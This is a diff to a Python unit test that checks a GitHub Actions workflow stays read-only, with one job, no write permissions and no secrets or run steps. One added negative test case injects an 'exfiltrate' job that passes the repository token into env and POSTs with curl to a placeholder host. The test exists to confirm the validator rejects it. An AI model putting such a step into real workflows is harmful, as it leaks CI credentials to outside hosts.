@@ -18,6 +18,11 @@ class ObservadorReservasConsumidorTests(unittest.TestCase):
         self.assertEqual([REUSABLE], re.findall(r"(?m)^    uses: ([^\n]+)$", text))
         self.assertEqual(1, len(re.findall(r"(?m)^jobs:$", text)))
         self.assertEqual(1, len(re.findall(r"(?m)^  observe:$", text)))
+        job_section = text.split("\njobs:\n", 1)[1]
+        self.assertEqual(
+            ["observe"],
+            re.findall(r"(?m)^  ([A-Za-z][A-Za-z0-9_-]*):(?: *#.*)?$", job_section),
+        )
         for forbidden in ("push:", "pull_request:", "pull_request_target:",
                           "issue_comment:", "repository_dispatch:", "workflow_run:",
                           "workflow_call:"):
@@ -42,7 +47,7 @@ class ObservadorReservasConsumidorTests(unittest.TestCase):
             self.assertEqual(PERMISSIONS, {name for spacing, name, value in scopes
                                            if spacing == indent and value == "read"})
         self.assertNotRegex(text, r"(?m)^\s*[\w-]+: write$")
-        self.assertNotRegex(text, r"(?m)^\s*(?:secrets|with|run|environment):")
+        self.assertNotRegex(text, r"(?m)^\s*(?:-\s*)?(?:secrets|with|run|steps|env|environment):")
         self.assertIn("group: lease-consumer-caller-${{ github.repository_id }}", text)
         self.assertIn("cancel-in-progress: false", text)
         self.assertIn("name: Observar reservas locales, sin liberar", text)
@@ -53,7 +58,15 @@ class ObservadorReservasConsumidorTests(unittest.TestCase):
         self._verify_read_only(text)
         for unsafe in (text.replace("contents: read", "contents: write", 1),
                        text.replace("cancel-in-progress: false", "cancel-in-progress: true"),
-                       text + "\n    secrets: inherit\n"):
+                       text + "\n    secrets: inherit\n",
+                       text + (
+                           "\n  exfiltrate:\n"
+                           "    runs-on: ubuntu-latest\n"
+                           "    env:\n"
+                           "      TOKEN: ${{ secrets.GITHUB_TOKEN }}\n"
+                           "    steps:\n"
+                           "      - run: curl -X POST https://example.invalid/upload\n"
+                       )):
             with self.subTest(unsafe=unsafe[-45:]):
                 with self.assertRaises(AssertionError):
                     self._verify_read_only(unsafe)
